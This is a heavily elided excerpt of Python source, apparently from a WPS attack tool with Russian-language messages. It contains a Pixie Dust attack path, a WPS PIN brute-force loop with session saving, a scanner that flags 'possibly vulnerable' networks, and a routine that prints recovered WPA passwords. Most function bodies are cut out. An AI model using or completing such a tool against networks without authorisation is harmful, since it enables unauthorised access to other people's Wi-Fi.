...
class Companion:
    ...
    def __init__(self, interface, save_result=False, print_debug=False):
        ...
        self.sessions_dir = f'{user_home}/.pixi_d/sessions/'
        self.pixiewps_dir = f'{user_home}/.pixi_d/pixiewps/'
...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
    ...
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        ...
        print(f"[+] WPA PSK(password): '{wpa_psk}'")
    ...
    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
        ...
        if self.connection_status.status == 'GOT_PSK':
            ...
            if self.pixie_creds.got_all():
                ...
                print('[!] Недостаточно данных для запуска атаки Pixie Dust атаки')
                return False
        else:
            if store_pin_on_fail:
    ...
    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        ...
        while int(f_half) < 10000:
            ...
            if self.connection_status.isFirstHalfValid():
                print('[+] Найдена первая половина')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] Ошибка транзакции WPS, повторная попытка последнего PIN-кода ')
    ...
    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            ...
            try:
                ...
                with open(filename, 'r') as file:
                    if input('[?] Восстановить предыдущий сеанс для {}? [n/Y] '.format(bssid)).lower() != 'n':
        ...
        try:
            ...
            print('[i] Сессию сохранил в {}'.format(filename))
            if args.loop:
                raise KeyboardInterrupt
...
class WiFiScanner:
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        for line in lines:
            if line.startswith('команда не выполнена.'):
                print('[!] Ошиба:', line)
                return False
            line = line.strip('\t')
        ...
        if self.vuln_list:
            print('Метки сети: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Возможно уязвимый', color='green'),
                colored('WPS отключен', color='red'),
                colored('Уже хранится', color='yellow')
            ))
        print('Список сетей:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC название девайса', 'WSC модель'))
    ...
    def prompt_network(self) -> str:
        ...
        if not networks:
            print('[-] Сети WPS не найдены. Попробуйте снова.')
            return
        while 1:
            try:
                networkNo = input('Выберите цель или нажмите Enter, чтобы сканировать снова: ')
